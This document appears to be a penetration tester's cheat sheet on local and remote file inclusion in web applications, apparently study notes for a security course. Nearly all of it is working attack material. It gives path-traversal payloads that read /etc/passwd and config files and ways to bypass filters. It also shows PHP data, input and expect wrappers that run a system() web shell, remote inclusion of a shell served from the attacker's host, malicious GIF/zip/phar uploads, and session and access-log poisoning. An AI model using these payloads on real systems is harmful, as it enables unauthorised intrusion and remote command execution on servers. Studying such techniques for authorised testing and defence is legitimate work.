
## Table of Contents:

- [[#Read vs Write Functions]]
- [[#LFI]]
- [[#Basic Bypass]]
- [[#PHP Wrappers]]
- [[#Remote File Inclusion (RFI)]]
- [[#File Upload]]
- [[#Zip Upload]]
- [[#Phar Upload]]
- [[#Log Poisoning]]
- [[#Fuzzing Parameters]]
- [[#Fuzzing Server Files]]
- [[#Automated Tools]]

---

## Read vs Write Functions

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

---
## LFI

#### Basic LFI

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```

#### Path Traversal

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../../../etc/passwd
```

#### Filename Prefix

```php
include("lang_" . $_GET['language']);
```

Workaround is using `/`:
```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../../../../etc/passwd
```

#### Appended Extensions

```php
include($_GET['language'] . ".php");
```

If the php version is old we may use the 4096 characters trick to bypass the filter.
If the php version is recent enough we can only read .php file (Using php wrappers)

#### Second Order Attacks

Imagine that our avatar is under `/profile/avatar/$username`
If we take as username `../../../../../../etc/passwd`, the final path will be:
```
http://<SERVER_IP>:<PORT>/index.php?language=/profile/avatar/$username/../../../../../../etc/passwd
```

---
## Basic Bypass

See `lfi-jhaddix` wordlist.
#### Non-Recursive Path Traversal Filters
```php
$language = str_replace('../', '', $_GET['language']);
```

**Bypass**
```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

Depending on the backend filter, there are multiple ways to bypass them.

#### URL Encoding (All characters) 

**Encode once or twice**
```
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

#### Approved Path

For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

**Bypass**
```
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../../../etc/passwd
```

#### Null Bytes to bypass appended extensions (PHP Versions before 5.5)
`/etc/passwd%00`. In other earlier versions of PHP we can do path truncation using the max limit of 4096 characters hence repeating `./` 2048 times or so.

---
## PHP Wrappers

If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

```Note
Useful if we want read php file and not execute them.
```

### Source Code Disclosure

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

### Data Wrapper for RCE

**First we need to check if allow_url_include is enabled in php.ini**
```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo= # allow_url_include = On
<p class="read-more">
```

#### RCE with Data Wrapper

**Encode Tiny shell:**
```shell
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Url encode the base64 shell:**
```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

**Execute:**
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**Or with curl:**
```shell
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input Wrapper

The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
```shell
> curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect Wrapper - RCE

**Check if expect extension is enabled**
```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" 
```

**Execute:**
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

----

## Remote File Inclusion (RFI)

See which function are vulnerable on the top of the page.

**Verify RFI**
```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" 
```

Decode output and also need the use of a vulnerable function
```
allow_url_include = On
```


**First check with a local URL**
```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

**RCE - Web Shell** 
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**HTTP:**
```shell
python3 -m http.server <LISTENING_PORT>

http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**FTP:**
```shell
sudo python -m pyftpdlib -p 21

http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

**SMB (Windows webserver):**
```shell
impacket-smbserver -smb2support share $(pwd)

http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

---
## File Upload

See at the top of the page for [[#Read vs Write Functions]] functions:

**Crafting Malicious Image:**
```shell 
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Uploaded File Path:**
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Execute**
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

---
## Zip Upload

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. (Not enabeld by default)
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```Note
Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
```

**Execute:**
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

---
## Phar Upload

We can use the `phar://` wrapper to achieve a similar result.
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

**Compile:**
```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

**Execute:**
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

## Log Poisoning

### PHP SESSION ID

There are saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.

The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix:`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`

**File existence:**
 ```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 ```

This file contains 2 values: Page and Preference in which page is under our control.

**Poison Page Value:**
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**Execute:**
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

```Note
To execute another command, the session file has to be poisoned with the web shell again.
```

### Server Log Poisoning

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

**Access to confirm existence:**
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

**Modify User-Agent with burp or curl:**
```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

**RCE (Use Burp to send request because output is long):**
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

```Tip
The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files.
```

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

---

## Fuzzing Parameters

```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

---

## Fuzzing Server Files

#### Server Webroot
```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

Web root is at `/var/www/html` here.

#### Server Logs/Configurations
```shell
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

```shell
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```


---

## Automated Tools

We can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) or [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt). The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy) to automate the whole process but most run on `python2` sadly `:(`.

---